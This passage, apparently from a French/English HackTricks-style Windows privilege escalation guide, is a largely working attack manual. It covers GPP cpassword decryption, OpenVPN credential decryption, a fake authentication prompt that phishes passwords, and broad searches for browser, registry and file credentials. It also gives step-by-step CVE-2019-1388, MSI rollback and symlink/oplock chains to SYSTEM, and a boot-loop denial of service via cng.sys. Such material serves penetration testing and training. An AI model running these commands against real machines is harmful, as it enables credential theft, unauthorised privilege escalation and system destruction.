.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier appelé **SiteList.xml**

### Cached GPP Pasword

Une fonctionnalité était auparavant disponible et permettait le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d’importantes failles de sécurité. Premièrement, les Group Policy Objects (GPOs), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par n’importe quel utilisateur du domaine. Deuxièmement, les mots de passe contenus dans ces GPPs, chiffrés en AES256 à l’aide d’une clé par défaut publiquement documentée, pouvaient être déchiffrés par n’importe quel utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre à des utilisateurs d’obtenir des privilèges élevés.

Pour atténuer ce risque, une fonction a été développée pour rechercher les fichiers GPP mis en cache localement contenant un champ "cpassword" non vide. Lorsqu’un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l’emplacement du fichier, ce qui facilite l’identification et la remédiation de cette vulnérabilité de sécurité.

Recherchez dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant W Vista)_ ces fichiers :

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour déchiffrer le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Using crackmapexec pour obtenir les mots de passe :
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuration Web IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec des credentials :
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Identifiants OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Journaux
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des credentials

Vous pouvez toujours **demander à l'utilisateur de saisir ses credentials, voire les credentials d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client les **credentials** est vraiment **risqué**) :
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Fichiers possibles contenant des identifiants**

Fichiers connus qui contenaient autrefois des **passwords** en **clear-text** ou en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Recherchez dans tous les fichiers proposés :
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la Corbeille

Vous devriez aussi vérifier la Corbeille pour y chercher des identifiants

Pour **récupérer des mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre possibles avec des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Vous devriez vérifier les dbs où les mots de passe de **Chrome or Firefox** sont stockés.\
Vérifiez aussi l’historique, les bookmarks et les favourites des navigateurs, au cas où certains **passwords are** y seraient stockés.

Outils pour extraire les mots de passe des navigateurs :

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** est une technologie intégrée au système d’exploitation Windows qui permet l’**intercommunication** entre des composants logiciels de différents langages. Chaque composant COM est **identifié via un class ID (CLSID)** et chaque composant expose des fonctionnalités via une ou plusieurs interfaces, identifiées par des interface IDs (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface** respectivement. Ce registre est créé en fusionnant **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dans les CLSIDs de ce registre, vous pouvez trouver la sous-clé de registre **InProcServer32** qui contient une **default value** pointant vers une **DLL** et une valeur appelée **ThreadingModel** qui peut être **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

En gros, si vous pouvez **overwrite any of the DLLs** qui vont être exécutées, vous pourriez **escalate privileges** si cette DLL doit être exécutée par un autre utilisateur.

Pour apprendre comment les attaquants utilisent COM Hijacking comme mécanisme de persistence, consultez :


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Recherche d'un fichier avec un nom de fichier spécifique**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Rechercher dans le registre des noms de clés et des mots de passe**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Outils qui recherchent des mots de passe

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant des mots de passe mentionnés sur cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil pour extraire des mots de passe d'un système.

L'outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche des **sessions**, des **usernames** et des **passwords** de plusieurs outils qui enregistrent ces données en texte clair (PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **un processus exécuté en tant que SYSTEM open a new process** (`OpenProcess()`) **avec un accès complet**. Le même processus **crée aussi un nouveau processus** (`CreateProcess()`) **avec des privilèges faibles mais en héritant de tous les handles ouverts du processus principal**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.

Windows fournit une fonctionnalité appelée **Named Pipes**, permettant à des processus sans lien de partager des données, même sur différents réseaux. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **named pipe server** et **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l'interface graphique (via console ou RDP) et que UAC est activé, dans certaines versions de Microsoft Windows il est possible d'exécuter un terminal ou tout autre processus en tant que "NT\AUTHORITY SYSTEM" depuis un utilisateur non privilégié.

Cela permet d'élever les privilèges et de contourner UAC en même temps avec la même vulnérabilité. De plus, il n'est pas nécessaire d'installer quoi que ce soit et le binaire utilisé pendant le processus est signé et émis par Microsoft.

Certains des systèmes affectés sont les suivants :
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il est nécessaire d’effectuer les étapes suivantes :
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Vous avez tous les fichiers et informations nécessaires dans le dépôt GitHub suivant :

https://github.com/jas502n/CVE-2019-1388

## De Administrator Medium à High Integrity Level / UAC Bypass

Lisez ceci pour **apprendre les Integrity Levels** :

{{#ref}}
integrity-levels.md
{{#endref}}

Puis **lisez ceci pour apprendre UAC et les UAC bypasses** :

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename à SYSTEM EoP

La technique décrite [**dans ce billet de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) avec un exploit code [**disponible ici**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L’attaque consiste essentiellement à abuser de la fonctionnalité de rollback de Windows Installer pour remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela, l’attaquant doit créer un **malicious MSI installer** qui sera utilisé pour détourner le dossier `C:\Config.Msi`, lequel sera ensuite utilisé par Windows Installer pour stocker les fichiers de rollback lors de la désinstallation d’autres packages MSI, où les fichiers de rollback auront été modifiés pour contenir le payload malveillant.

La technique résumée est la suivante :

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### De Arbitrary File Delete/Move/Rename à SYSTEM EoP

La principale technique MSI rollback (la précédente) suppose que vous pouvez supprimer un **dossier entier** (par exemple, `C:\Config.Msi`). Mais que faire si votre vulnérabilité ne permet que la **suppression arbitraire de fichiers** ?

Vous pourriez exploiter les **internals NTFS** : chaque dossier possède un flux de données alternatif caché appelé :
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ce flux stocke les **métadonnées d’index** du dossier.

Donc, si vous **supprimez le flux `::$INDEX_ALLOCATION`** d’un dossier, NTFS **supprime l’ensemble du dossier** du système de fichiers.

Vous pouvez faire cela en utilisant des API standard de suppression de fichiers comme :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De la suppression du contenu d’un dossier à SYSTEM EoP
Et si votre primitive ne vous permet pas de supprimer des fichiers/dossiers arbitraires, mais qu’elle **autorise la suppression du *contenu* d’un dossier contrôlé par un attaquant** ?

1. Step 1: Configurez un dossier et un fichier leurre
- Créez : `C:\temp\folder1`
- À l’intérieur : `C:\temp\folder1\file1.txt`

2. Step 2: Placez un **oplock** sur `file1.txt`
- L’oplock **met l’exécution en pause** lorsqu’un processus privilégié tente de supprimer `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Étape 3 : Déclencher le processus SYSTEM (par exemple, `SilentCleanup`)
- Ce processus analyse des dossiers (par exemple, `%TEMP%`) et tente de supprimer leur contenu.
- Lorsqu’il atteint `file1.txt`, l’**oplock se déclenche** et remet le contrôle à votre callback.

4. Étape 4 : Dans le callback de l’oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
- Cela vide `folder1` sans casser l’oplock.
- Ne supprimez pas `file1.txt` directement — cela libérerait l’oplock prématurément.

- Option B : Convertir `folder1` en **junction** :
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C : Créer un **symlink** dans `\RPC Control` :
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Cela cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Step 5: Release the oplock
- Le processus SYSTEM continue et essaie de supprimer `file1.txt`.
- Mais maintenant, à cause du junction + symlink, il supprime en réalité :
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Résultat** : `C:\Config.Msi` est supprimé par SYSTEM.

### De Arbitrary Folder Create à Permanent DoS

Exploitez une primitive qui vous permet de **créer un dossier arbitraire en tant que SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ni **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) avec le nom d’un **pilote Windows critique**, par exemple :
```
C:\Windows\System32\cng.sys
```
- Ce chemin correspond normalement au pilote en mode noyau `cng.sys`.
- Si vous le **pré-créez en tant que dossier**, Windows ne parvient pas à charger le pilote réel au démarrage.
- Ensuite, Windows essaie de charger `cng.sys` pendant le démarrage.
- Il voit le dossier, **échoue à résoudre le vrai pilote**, et **plante ou bloque le démarrage**.
- Il n’y a **aucun fallback**, et **aucune récupération** sans intervention externe (par ex. réparation du démarrage ou accès au disque).

### Des chemins de log/backup privilégiés + des symlinks OM vers un overwrite arbitraire / boot DoS

Quand un **service privilégié** écrit des logs/exports vers un chemin lu depuis une **config writable**, redirigez ce chemin avec **Object Manager symlinks + NTFS mount points** pour transformer l’écriture privilégiée en overwrite arbitraire (même **sans** SeCreateSymbolicLinkPrivilege).

**Requirements**
- La config qui stocke le chemin cible est writable par l’attaquant (par ex. `%ProgramData%\...\.ini`).
- Possibilité de créer un mount point vers `\RPC Control` et un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Une opération privilégiée qui écrit vers ce chemin (log, export, report).

**Chaîne d’exemple**
1. Lisez la config pour récupérer la destination de log privilégiée, par ex. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` dans `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirigez le chemin sans admin :
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendre que le composant privilégié écrive le log (par ex., l'admin déclenche "send test SMS"). L'écriture se retrouve maintenant dans `C:\Windows\System32\cng.sys`.
4. Inspecter la cible écrasée (parseur hex/PE) pour confirmer la corruption ; le reboot force Windows à charger le chemin du driver altéré → **boot loop DoS**. Cela se généralise aussi à tout fichier protégé qu'un service privilégié ouvrira en écriture.

> `cng.sys` est normalement chargé depuis `C:\Windows\System32\drivers\cng.sys`, mais si une copie existe dans `C:\Windows\System32\cng.sys` elle peut être tentée en premier, ce qui en fait une cible DoS fiable pour des données corrompues.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Lors de la création d'un binaire de service, assure-toi que c'est un service valide ou que le binaire effectue les actions nécessaires le plus vite possible, car il sera tué au bout de 20s s'il ne s'agit pas d'un service valide.

### AlwaysInstallElevated

Depuis un processus à High Integrity, tu peux essayer d'**activer les entrées de registre AlwaysInstallElevated** et d'**installer** un reverse shell en utilisant un wrapper _**.msi**_.\
[Plus d'informations sur les clés de registre impliquées et sur la façon d'installer un package _.msi_ ici.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Tu peux** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tu as ces privilèges de token (probablement tu les trouveras dans un processus déjà en High Integrity), tu pourras **ouvrir presque n'importe quel processus** (non protégé) avec le privilège SeDebug, **copier le token** du processus, et créer un **processus arbitraire avec ce token**.\
Cette technique consiste généralement à **sélectionner n'importe quel processus exécuté en tant que SYSTEM avec tous les privilèges du token** (_oui, tu peux trouver des processus SYSTEM sans tous les privilèges du token_).\
**Tu peux trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour élever les privilèges dans `getsystem`. La technique consiste à **créer un pipe puis à créer/abuser d'un service pour écrire dans ce pipe**. Ensuite, le **serveur** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **usurper le token** du client du pipe (le service) et obtenir les privilèges SYSTEM.\
Si tu veux [**en savoir plus sur les name pipes tu devrais lire ceci**](#named-pipe-client-impersonation).\
Si tu veux lire un exemple de [**comment passer de high integrity à System en utilisant des name pipes tu devrais lire ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si tu arrives à **hijacker une dll** **chargée** par un **processus** exécuté en tant que **SYSTEM**, tu pourras exécuter du code arbitraire avec ces permissions. Par conséquent, Dll Hijacking est aussi utile pour ce type d'élévation de privilèges et, en plus, il est **beaucoup plus facile à réaliser depuis un processus à high integrity**, car il aura des **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Tu peux** [**en savoir plus sur Dll hijacking ici**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lire :** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Meilleur outil pour rechercher des vecteurs d'élévation de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les mauvaises configurations et les fichiers sensibles (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines mauvaises configurations possibles et collecte des infos (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les mauvaises configurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Il extrait les informations de session enregistrées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utilise -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants de Credential Manager. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray des mots de passe collectés à travers le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un outil PowerShell de spoofing ADIDNS/LLMNR/mDNS et de man-in-the-middle.**\
